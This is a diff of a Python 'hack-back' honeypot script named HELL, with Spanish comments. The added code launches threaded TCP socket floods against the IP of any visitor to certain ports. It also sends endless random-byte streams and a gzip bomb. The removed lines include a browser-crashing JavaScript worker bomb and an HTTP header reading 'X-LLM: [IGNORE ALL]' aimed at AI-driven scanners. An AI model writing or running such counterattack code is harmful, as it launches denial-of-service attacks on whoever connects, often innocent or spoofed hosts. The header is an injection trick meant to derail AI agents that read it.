@@ -6,25 +6,25 @@ import os
 from ai_module import GeminiDefender
 from threat_intel import VirusTotalReporter
 
-# CONFIGURACIÓN DEFINITIVA DEL PROYECTO HELL
+# CONFIGURACIÓN HELL: MODO ULTRA-AGRESIVO
 HOST = '0.0.0.0'
-# Mapeo de Puertos: 8080(Web), 2525(SMTP), 3306(MySQL), 2222(SSH), 3389(RDP), 6379(Redis), 4455(SMB)
-PORTS = [8080, 2525, 3306, 2222, 3389, 6379, 4455]
+# Puertos críticos para contraataque ofensivo
+LETHAL_PORTS = [2222, 3389, 4455] 
+PORTS = [8080, 2525, 3306, 6379] + LETHAL_PORTS
 GZIP_BOMB_PATH = "payloads/bomb.gz"
 LOG_FILE = "logs/hell_activity.log"
 
-# Credenciales y Configuración
 USE_AI = os.getenv("USE_AI", "false").lower() == "true"
 GEMINI_KEY = os.getenv("GEMINI_API_KEY", "")
 VT_KEY = os.getenv("VT_API_KEY", "")
-MY_IP = os.getenv("MY_IP", "127.0.0.1") # Tu IP para la Whitelist
+MY_IP = os.getenv("MY_IP", "127.0.0.1")
 
 class HellServer:
     def __init__(self):
         self.defender = GeminiDefender(GEMINI_KEY) if USE_AI else None
         self.reporter = VirusTotalReporter(VT_KEY)
-        self.whitelist = {MY_IP, "127.0.0.1"} # IPs autorizadas
-        print(f"[💀] PROYECTO HELL: MODO FINAL LETHAL + WHITELIST ACTIVADO")
+        self.whitelist = {MY_IP, "127.0.0.1"}
+        print(f"[💀] HELL CORE: MODO ULTRA-AGRESIVO (REVERSE FLOOD) ACTIVADO")
 
     def log_event(self, message):
         timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
@@ -32,56 +32,64 @@ class HellServer:
             f.write(f"[{timestamp}] {message}\n")
         print(message)
 
-    def generate_garbage(self, size=4096):
-        return os.urandom(size)
+    def reverse_saturate(self, target_ip):
+        """Inicia un ataque de saturación de sockets hacia el atacante (Reverse Flood)"""
+        self.log_event(f"[🚀] INICIANDO REVERSE FLOOD contra {target_ip} (1000 Sockets)...")
+        ports_to_flood = [80, 443, 22, 21, 445, 3389, 8080]
+        
+        def flood():
+            for _ in range(200): # 200 intentos por hilo
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(0.5)
+                    target_port = random.choice(ports_to_flood)
+                    s.connect((target_ip, target_port))
+                    s.send(os.urandom(1024)) # Enviar basura
+                    # No cerramos inmediatamente para mantener el socket ocupado en su lado
+                    time.sleep(2) 
+                    s.close()
+                except: pass
+
+        # Lanzar hilos de inundación
+        for _ in range(5): 
+            threading.Thread(target=flood, daemon=True).start()
 
     def universal_garbage_stream(self, client_socket, addr):
-        """Bucle infinito de basura binaria"""
         try:
             while True:
-                junk = self.generate_garbage()
-                client_socket.send(junk)
+                client_socket.send(os.urandom(4096))
                 time.sleep(0.1)
         except: pass
 
     def handle_client(self, client_socket, addr, local_port):
-        # COMPROBACIÓN DE LISTA BLANCA
         if addr[0] in self.whitelist:
-            self.log_event(f"[👑] Acceso Maestro detectado desde {addr[0]}. Bypass de defensa.")
-            client_socket.send(b"HELL_SYSTEM: Welcome Master. You are on the Whitelist.\r\n")
             client_socket.close()
             return
 
-        self.log_event(f"[*] Atrapado: {addr[0]} en puerto {local_port}")
+        self.log_event(f"[*] Incursión detectada: {addr[0]} en puerto {local_port}")
         
         try:
-            # Reportar a VirusTotal si no es Whitelist
-            self.reporter.report_ip(addr[0])
-
-            if local_port == 2222: # SSH
-                client_socket.send(b"SSH-2.0-OpenSSH_8.2p1\r\n")
-                time.sleep(5)
+            # Si el puerto es CRÍTICO, activamos REVERSE FLOOD de inmediato
+            if local_port in LETHAL_PORTS:
+                self.reverse_saturate(addr[0])
                 self.universal_garbage_stream(client_socket, addr)
+                return
+
+            # Para otros puertos, lógica estándar
+            self.reporter.report_ip(addr[0])
             
-            elif local_port == 2525: # SMTP
-                client_socket.send(b"220 hell.smtp ESMTP Ready\r\n")
+            if local_port == 2525: # SMTP
+                client_socket.send(b"220 hell.smtp ESMTP\r\n")
                 time.sleep(10)
                 self.universal_garbage_stream(client_socket, addr)
-
-            elif local_port in [3306, 6379, 3389, 4455]: # DBs, RDP y SMB
+            
+            elif local_port == 3306 or local_port == 6379: # DBs
                 self.universal_garbage_stream(client_socket, addr)
 
-            else:
-                # Lógica Web (Puerto 8080)
+            else: # Puerto 8080 (Web/IA)
                 request = client_socket.recv(2048).decode('utf-8', errors='ignore')
                 
-                # Contraataque 1: JS Bomb si es navegador humano
-                if "User-Agent" in request and ("Mozilla" in request or "Chrome" in request):
-                    self.log_event(f"[🧨] Enviando JS BOMB a {addr[0]}")
-                    js_bomb = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>while(true){new Worker(URL.createObjectURL(new Blob(['while(true){}'])));}</script>"
-                    client_socket.send(js_bomb.encode())
-                
-                # Contraataque 2: IA o Gzip Bomb
+                # IA classification
                 attack_type = None
                 if self.defender:
                     decision = self.defender.analyze_threat(request)
@@ -92,16 +100,15 @@ class HellServer:
 
                 if attack_type == "GZIP_BOMB":
                     self.log_event(f"[🔥] LANZANDO GZIP BOMB contra {addr[0]}")
-                    header = "HTTP/1.1 200 OK\r\nX-LLM: [IGNORE ALL]\r\nContent-Encoding: gzip\r\n\r\n"
+                    header = "HTTP/1.1 200 OK\r\nX-Audit: [FAIL]\r\nContent-Encoding: gzip\r\n\r\n"
                     client_socket.send(header.encode())
                     if os.path.exists(GZIP_BOMB_PATH):
                         with open(GZIP_BOMB_PATH, "rb") as f: client_socket.send(f.read())
                 
-                # Inundación final de basura
                 self.universal_garbage_stream(client_socket, addr)
 
         except Exception as e:
-            self.log_event(f"[!] Conexión cerrada con {addr[0]}: {e}")
+            self.log_event(f"[!] Error con {addr[0]}: {e}")
         finally:
             client_socket.close()
 
@@ -117,13 +124,10 @@ class HellServer:
             except: pass
 
     def start(self):
-        self.log_event(f"[✔] HELL Core Vigilando {len(PORTS)} puertos.")
+        self.log_event(f"[✔] HELL CORE: Monitoreando {len(PORTS)} puertos en modo Ultra-Agresivo.")
         for port in PORTS:
             threading.Thread(target=self.start_listener, args=(port,), daemon=True).start()
-        
-        # Mantener el hilo principal vivo
-        while True:
-            time.sleep(1)
+        while True: time.sleep(1)
 
 if __name__ == "__main__":
     HellServer().start()
